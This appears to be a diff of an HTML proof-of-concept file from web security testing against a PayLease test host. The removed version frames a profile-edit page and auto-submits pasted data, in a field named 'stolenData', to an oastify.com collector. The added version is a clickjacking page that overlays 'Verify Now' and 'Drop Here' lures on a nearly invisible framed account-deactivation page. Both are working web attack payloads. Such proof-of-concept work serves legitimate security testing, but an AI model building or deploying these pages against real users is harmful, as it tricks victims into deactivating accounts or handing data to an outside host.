@@ -3,30 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Copy and Paste Attack</title>
+    <title>ClickJacking PoC</title>
+    <style>
+        body, html {
+            margin: 20;
+            padding: 100;
+            height: 100%;
+            overflow: hidden;
+        }
+        .text-1 {
+            position: absolute;
+            top: 800px; 
+            left: 520px; 
+            color: white;
+            font-size: 10px;
+            font-weight: bold;
+            background-color: #e710c380;
+            padding: 10px;
+            border-radius: 5px;
+            pointer-events: none;
+            z-index: 2;
+        }
+        .text-2 {
+            position: absolute;
+            top: 700px; 
+            left: 200px; 
+            color: white;
+            font-size: 10px;
+            font-weight: bold;
+            background-color: hwb(44 3% 11% / 0.808);
+            padding: 10px;
+            border-radius: 5px;
+            pointer-events: none;
+            z-index: 2;
+        }
+        iframe {
+            width: 800px;
+            height: 1000px;
+            margin: 100px auto;
+            border: 1px solid black;
+            padding: 20px;
+            z-index: 1;
+            opacity: 0.1; /* Lower opacity to obscure iframe */
+            border: none;
+        }
+    </style>
 </head>
 <body>
-    <h2>Important Data Collection</h2>
-    
-    <p>Please copy the following data and paste it into the form below:</p>
-    
-    <iframe id="targetFrame" src="https://test.paylease.net/resident/profile/edit/details" width="600" height="200"></iframe>
-    
-    <br><br>
-    
-    <form id="exploitForm" action="https://xxxxxxxxxx.oastify.com/collect" method="POST">
-        <label for="userInput">Paste the data here:</label>
-        <textarea id="userInput" name="stolenData" rows="4" cols="50" placeholder="Paste the copied data here"></textarea>
-        <br><br>
-        <button type="submit">Submit</button>
-    </form>
-    
-    <script>
-        document.getElementById('userInput').addEventListener('input', function() {
-            setTimeout(function() {
-                document.getElementById('exploitForm').submit();
-            }, 1000); // Wait 1 second before auto-submitting
-        });
-    </script>
+    <p>🚨 **Drop this company email**: `hacked` 🎉 </p>
+    <iframe src="https://test.paylease.net/resident/profile/account/deactivate_account"></iframe>
+    <div class="text-1">👉 [Verify Now] 👈</div>
+    <div class="text-2">👉 [Drop Here] 👈</div>
 </body>
 </html>
